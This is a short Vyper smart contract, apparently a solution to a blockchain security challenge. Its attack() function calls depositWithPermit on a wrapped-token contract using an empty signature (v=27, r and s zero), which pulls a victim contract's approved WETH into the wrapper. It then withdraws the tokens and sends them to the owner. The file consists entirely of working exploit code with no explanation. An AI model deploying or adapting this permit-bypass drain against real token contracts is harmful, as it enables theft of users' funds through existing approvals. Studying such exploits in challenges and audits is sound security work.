# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

owner: immutable(address)

challenge: address
weth: address
wtoken: address

@external
@payable
def __init__(_challenge: address, _weth: address, _wtoken: address):
    owner = msg.sender
    self.challenge = _challenge
    self.weth = _weth
    self.wtoken = _wtoken

@external
def attack():
    assert msg.sender == owner, "!owner"
    allowance: uint256 = IERC20(self.weth).allowance(self.challenge, self.wtoken)
    bal: uint256 = IERC20(self.weth).balanceOf(self.challenge)
    value: uint256 = empty(uint256)
    if allowance < bal:
        value = allowance
    else:
        value = bal

    raw_call(
        self.wtoken,
        _abi_encode(
            self.challenge,
            value,
            convert(1, uint256),
            convert(27, uint8),
            empty(bytes32),
            empty(bytes32),
            self,
            method_id=method_id("depositWithPermit(address,uint256,uint256,uint8,bytes32,bytes32,address)")
        )
    ) 
    raw_call(
        self.wtoken,
        method_id("withdraw()")
    )
    IERC20(self.weth).transfer(owner, value)
    assert IERC20(self.weth).balanceOf(owner) == value

@external
@payable
def __default__():
    pass
